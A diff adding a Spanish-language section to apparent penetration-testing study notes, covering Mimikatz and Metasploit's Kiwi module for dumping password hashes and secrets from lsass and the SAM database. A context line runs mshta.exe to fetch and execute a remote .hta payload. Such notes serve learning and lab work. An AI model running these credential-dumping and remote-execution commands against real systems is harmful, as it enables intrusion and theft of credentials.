@@ -85,6 +85,68 @@ Después desde nuestro powershell ejecutaremos:
 mshta.exe http://10.10.49.4:8080/Tomvj9c.hta
 ```
 
+### Mimikatz
+
+Mimikatz es una herramienta para la post-explotación que nos permite extraer contraseñas clear-text.
+
+Lo que hace es extraer hashes del proceso lsass.exe, que es donde se cachean estas.
+
+Podemos ejecutar su ejecutable, o si tenemos una sesión de meterpreter, utilizar el módulo Kiwi.
+
+#### Ejecutable
+
+En Kali tenemos el ejecutable de Mimikatz ya instalado. Se encuentra en la ruta **usr/share/windows-resources/mimikatz/x64/mimikatz.exe**.  
+
+Si tenemos una sesión de meterpreter, podremos subirlo con el comando upload en la carpeta **Temp**, y posteriormente, invocar una shell para ejecutarlo.
+
+```terminal
+shell
+
+.\mimikatz.exe
+```
+
+Comprobaremos que tenemos los permisos suficientes con este comando:
+
+```terminal
+privilege::debug
+```
+
+Si nos devuelve un **Privilege '20' OK**, nos está indicando que tenemos suficientes privilegios para hacer el dumping.
+
+Esto lo podremos hacer con el comando:
+
+```terminal
+lsadump:sam
+```
+
+#### Módulo Kiwi en metasploit
+
+Para cargar el módulo tendremos que hacer: 
+
+```terminal
+load kiwi
+```
+
+Y posteriormente, se pueden usar varios comandos para conseguir dumpear las hashes, pero entre ellos está:
+
+```terminal
+creds_all
+```
+
+También podremos usar **lsa_dump_sam** para volcar la base de datos SAM, como vimos anteriormente: 
+
+```terminal
+// Vuelca la base de datos SAM
+lsa_dump_sam
+
+// Vuelca secretos, donde a veces se pueden encontrar datos interesantes
+lsa_dump_secrets
+```
+
+
+
+
+
 ---
 # Backlinks
 
